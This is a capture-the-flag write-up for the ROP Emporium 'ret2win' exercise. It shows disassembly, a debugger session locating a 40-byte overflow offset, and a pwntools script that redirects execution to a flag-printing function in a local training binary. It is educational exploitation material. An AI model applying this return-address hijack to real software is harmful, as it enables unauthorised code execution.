# ret2win

Locate a method within the binary that you want to call and do so by overwriting a saved return address on the stack.

```
t0thkr1s@kali ~/D/ret2win> r2 ret2win 
[0x00400650]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00400746]> afl
0x00400650    1 41           entry0                                                                                                           
0x00400610    1 6            sym.imp.__libc_start_main                                                                                        
0x00400680    4 50   -> 41   sym.deregister_tm_clones                                                                                         
0x004006c0    4 58   -> 55   sym.register_tm_clones                                                                                           
0x00400700    3 28           entry.fini0                                                                                                      
0x00400720    4 38   -> 35   entry.init0                                                                                                      
0x004007b5    1 92           sym.pwnme                                                                                                        
0x00400600    1 6            sym.imp.memset                                                                                                   
0x004005d0    1 6            sym.imp.puts                                                                                                     
0x004005f0    1 6            sym.imp.printf                                                                                                   
0x00400620    1 6            sym.imp.fgets                                                                                                    
0x00400811    1 32           sym.ret2win                                                                                                      
0x004005e0    1 6            sym.imp.system
0x004008b0    1 2            sym.__libc_csu_fini
0x004008b4    1 9            sym._fini
0x00400840    4 101          sym.__libc_csu_init
0x00400746    1 111          main
0x00400630    1 6            sym.imp.setvbuf
0x004005a0    3 26           sym._init
[0x00400650]> s main
[0x00400746]> pdf
            ; DATA XREF from entry0 @ 0x40066d
┌ 111: int main (int argc, char **argv, char **envp);
│           0x00400746      55             push rbp
│           0x00400747      4889e5         mov rbp, rsp
│           0x0040074a      488b050f0920.  mov rax, qword [obj.stdout] ; rdi
│                                                                      ; [0x601060:8]=0                         
│           0x00400751      b900000000     mov ecx, 0                  ; size_t size
│           0x00400756      ba02000000     mov edx, 2                  ; int mode
│           0x0040075b      be00000000     mov esi, 0                  ; char *buf
│           0x00400760      4889c7         mov rdi, rax                ; FILE*stream
│           0x00400763      e8c8feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)                                                                                             
│           0x00400768      488b05110920.  mov rax, qword [obj.stderr] ; obj.stderr__GLIBC_2.2.5
│                                                                      ; [0x601080:8]=0                         
│           0x0040076f      b900000000     mov ecx, 0                  ; size_t size
│           0x00400774      ba02000000     mov edx, 2                  ; int mode
│           0x00400779      be00000000     mov esi, 0                  ; char *buf
│           0x0040077e      4889c7         mov rdi, rax                ; FILE*stream
│           0x00400781      e8aafeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)                                                                                             
│           0x00400786      bfc8084000     mov edi, str.ret2win_by_ROP_Emporium ; 0x4008c8 ; "ret2win by ROP Emporium" ; const char *s                                                                                          
│           0x0040078b      e840feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400790      bfe0084000     mov edi, str.64bits         ; 0x4008e0 ; "64bits\n" ; const char *s
│           0x00400795      e836feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040079a      b800000000     mov eax, 0
│           0x0040079f      e811000000     call sym.pwnme
│           0x004007a4      bfe8084000     mov edi, str.Exiting        ; 0x4008e8 ; "\nExiting" ; const char *s
│           0x004007a9      e822feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004007ae      b800000000     mov eax, 0
│           0x004007b3      5d             pop rbp
└           0x004007b4      c3             ret
[0x00400746]>
```

```
[0x00400746]> s sym.ret2win
[0x00400811]> pdf
┌ 32: sym.ret2win ();
│           0x00400811      55             push rbp
│           0x00400812      4889e5         mov rbp, rsp
│           0x00400815      bfe0094000     mov edi, str.Thank_you__Here_s_your_flag: ; 0x4009e0 ; "Thank you! Here's your flag:" ; const char *format                                                                                                                                       
│           0x0040081a      b800000000     mov eax, 0
│           0x0040081f      e8ccfdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00400824      bffd094000     mov edi, str.bin_cat_flag.txt ; 0x4009fd ; "/bin/cat flag.txt" ; const char *string
│           0x00400829      e8b2fdffff     call sym.imp.system         ; int system(const char *string)
│           0x0040082e      90             nop
│           0x0040082f      5d             pop rbp
└           0x00400830      c3             ret
[0x00400811]> s sym.pwnme
[0x004007b5]> pdf
            ; CALL XREF from main @ 0x40079f
┌ 92: sym.pwnme ();
│           ; var char *s @ rbp-0x20
│           0x004007b5      55             push rbp
│           0x004007b6      4889e5         mov rbp, rsp
│           0x004007b9      4883ec20       sub rsp, 0x20
│           0x004007bd      488d45e0       lea rax, qword [s]
│           0x004007c1      ba20000000     mov edx, 0x20               ; 32 ; size_t n
│           0x004007c6      be00000000     mov esi, 0                  ; int c
│           0x004007cb      4889c7         mov rdi, rax                ; void *s
│           0x004007ce      e82dfeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
│           0x004007d3      bff8084000     mov edi, str.For_my_first_trick__I_will_attempt_to_fit_50_bytes_of_user_input_into_32_bytes_of_stack_buffer___What_could_possibly_go_wrong ; 0x4008f8 ; "For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\nWhat could possibly go wrong?" ; const char *s                                                                                       
│           0x004007d8      e8f3fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004007dd      bf78094000     mov edi, str.You_there_madam__may_I_have_your_input_please__And_don_t_worry_about_null_bytes__we_re_using_fgets ; 0x400978 ; "You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n" ; const char *s                                                                                                                                           
│           0x004007e2      e8e9fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004007e7      bfdd094000     mov edi, 0x4009dd           ; const char *format
│           0x004007ec      b800000000     mov eax, 0
│           0x004007f1      e8fafdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x004007f6      488b15730820.  mov rdx, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5
│                                                                      ; [0x601070:8]=0 ; FILE *stream                                        
│           0x004007fd      488d45e0       lea rax, qword [s]
│           0x00400801      be32000000     mov esi, 0x32               ; '2' ; 50 ; int size
│           0x00400806      4889c7         mov rdi, rax                ; char *s
│           0x00400809      e812feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x0040080e      90             nop
│           0x0040080f      c9             leave
└           0x00400810      c3             ret
[0x004007b5]> 
```

```
t0thkr1s@kali ~/D/ret2win> gdb -q ret2win 
GEF for linux ready, type `gef' to start, `gef config' to configure
79 commands loaded for GDB 8.3.1 using Python engine 3.7
[*] 1 command could not be loaded, run `gef missing` to know why.
Reading symbols from ret2win...
(No debugging symbols found in ret2win)
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'
gef➤  r
Starting program: /home/t0thkr1s/Downloads/ret2win/ret2win 
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400810 in pwnme ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffe120  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaag"
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x00007ffff7fb4590  →  0x0000000000000000
$rsp   : 0x00007fffffffe148  →  "faaaaaaag"
$rbp   : 0x6161616161616165 ("eaaaaaaa"?)
$rsi   : 0x00000000006022a1  →  "aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaa[...]"
$rdi   : 0x00007fffffffe121  →  "aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaag"
$rip   : 0x0000000000400810  →  <pwnme+91> ret 
$r8    : 0x00007fffffffe120  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaag"
$r9    : 0x00007ffff7fb9500  →  0x00007ffff7fb9500  →  [loop detected]
$r10   : 0x410             
$r11   : 0x246             
$r12   : 0x0000000000400650  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffe230  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe148│+0x0000: "faaaaaaag"  ← $rsp
0x00007fffffffe150│+0x0008: 0x0000000000400067  →   add al, bh
0x00007fffffffe158│+0x0010: 0x00007ffff7e1ebbb  →  <__libc_start_main+235> mov edi, eax
0x00007fffffffe160│+0x0018: 0x0000000000000000
0x00007fffffffe168│+0x0020: 0x00007fffffffe238  →  0x00007fffffffe508  →  "/home/t0thkr1s/Downloads/ret2win/ret2win"
0x00007fffffffe170│+0x0028: 0x0000000100040000
0x00007fffffffe178│+0x0030: 0x0000000000400746  →  <main+0> push rbp
0x00007fffffffe180│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400809 <pwnme+84>       call   0x400620 <fgets@plt>
     0x40080e <pwnme+89>       nop    
     0x40080f <pwnme+90>       leave  
 →   0x400810 <pwnme+91>       ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win", stopped 0x400810 in pwnme (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400810 → pwnme()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern search $rsp
[+] Searching '$rsp'
[+] Found at offset 40 (little-endian search) likely
[+] Found at offset 33 (big-endian search) 
gef➤  
```

```python3
#!/usr/bin/env python3
from pwn import *

binary = ELF('ret2win')

# overflow structure = padding + pwnme function address
overflow = b'A' * 40 + p64(0x00400811)
process = binary.process()
print(process.recv().decode())
info('Sending payload...')
process.sendline(overflow)
print(process.recvall().decode())
```

```
t0thkr1s@kali ~/D/ret2win> python3 exploit.py
[*] '/home/t0thkr1s/Downloads/ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/t0thkr1s/Downloads/ret2win/ret2win': pid 3340
ret2win by ROP Emporium
[*] Sending payload...
[+] Receiving all data: Done (299B)
[*] Stopped process '/home/t0thkr1s/Downloads/ret2win/ret2win' (pid 3340)

64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
```

> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}


